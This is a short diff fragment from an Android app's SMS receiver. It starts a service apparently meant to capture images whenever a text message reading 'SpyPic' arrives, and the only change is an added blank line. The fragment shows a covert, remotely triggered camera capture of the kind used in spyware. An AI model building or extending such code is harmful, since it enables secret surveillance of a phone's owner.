@@ -25,6 +25,7 @@ public class SmsReceiver extends BroadcastReceiver {
                         msg_from = msgs[i].getOriginatingAddress();
                         msgBody = msgs[i].getMessageBody();
                         if (msgBody.equals("SpyPic")) {
+
                             Log.i("SPY_CAM" , "Capturing Image");
                             Intent serviceIntent = new Intent(context, SpyPictureService.class);
                             context.startService(serviceIntent);
